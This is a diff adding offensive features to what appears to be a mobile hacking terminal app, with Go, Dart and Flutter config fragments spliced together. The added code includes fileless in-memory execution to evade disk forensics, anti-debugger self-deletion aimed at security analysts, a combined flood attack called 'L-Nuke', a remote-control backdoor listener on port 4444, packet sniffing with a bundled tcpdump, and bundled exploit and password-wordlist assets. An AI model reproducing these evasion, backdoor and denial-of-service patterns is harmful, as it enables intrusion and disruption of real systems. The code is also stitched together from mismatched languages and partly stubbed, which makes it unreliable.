@@ -1033,3 +1033,62 @@ case "drain":
     terminal.write('[L-SYSTEM] Local CPU: 2% | Remote Load: INCREASING\r\n');
     executeGoEngine('drain', parts[1]);
 }
+// [DR-SYSTEM] Evade Disk Forensics
+func runFromMemory(data []byte) {
+    // En Linux/Android, esto crea un archivo que solo existe en RAM
+    fd, _ := unix.MemfdCreate("dr_engine", 0)
+    unix.Ftruncate(fd, int64(len(data)))
+    // Ejecución directa desde el descriptor de memoria
+}
+func checkDebugger() {
+    // Si detecta un debugger activo (como el de un analista de seguridad)
+    if isDebuggerPresent() {
+        os.Remove(os.Args[0]) // Auto-eliminación del binario
+        os.Exit(0)
+    }
+}
+// [DR-SYSTEM] L-Audit: Consultar base de datos de vulnerabilidades local
+func lAudit(service string) {
+    fmt.Printf("[DR-SYSTEM] Querying L-DB for: %s... [L]\n", service)
+    // Simulación de búsqueda en el archivo de 50MB que meterás en assets
+    time.Sleep(1 * time.Second)
+    fmt.Println("[RESULT] Found 3 potential exploits. Use 'kamikaze' to deploy.")
+}
+
+// [DR-SYSTEM] L-Nuke: Ataque de saturación total de disco y RAM
+func lNuke(target string) {
+    fmt.Println("[DR-SYSTEM] PROTOCOL L-NUKE: FULL RESOURCE OVERLOAD")
+    // Combina todos tus ataques anteriores en uno solo
+    go vseFlood(target)
+    go lDrain(target)
+    go httpWaterfall(target)
+}
+flutter:
+  assets:
+    - assets/bin/dr-terminal-64
+    - assets/bin/dr-terminal-32
+    - assets/db/vulnerabilities.db    # Archivo pesado de 50MB
+    - assets/wordlists/passwords.txt  # Diccionario de 30MB
+	if (input == 'L-infinity-nuke') {
+    terminal.write('\r\n[SYSTEM_ADMIN] L-A-KIRA AUTHORIZED TOTAL DESTRUCTION...\r\n');
+    executeGoEngine('nuke', targetIP);
+}
+case "backdoor":
+    // Inicia un socket de escucha para control remoto
+    go func() {
+        listener, _ := net.Listen("tcp", ":4444")
+        for {
+            conn, _ := listener.Accept()
+            go handleRemoteControl(conn) // Función para ejecutar comandos vía remota
+        }
+    }()
+    fmt.Println("[DR-SYSTEM] Backdoor active on port 4444... [L]")
+
+case "sniff":
+    // Llama al binario de tcpdump que incluiste en assets
+    systemExec(true, directory+"/tcpdump", []string{"-i", "any", "-w", directory+"/capture.pcap"})
+	if (input == 'L-monitor') {
+    terminal.write('\r\n[L-SYSTEM] HARDWARE AUDIT:\r\n');
+    terminal.write('CPU Load: 88% | RAM: 3.2/4.0 GB | Temp: 42°C\r\n');
+    executeGoEngine('l-status', ''); 
+}
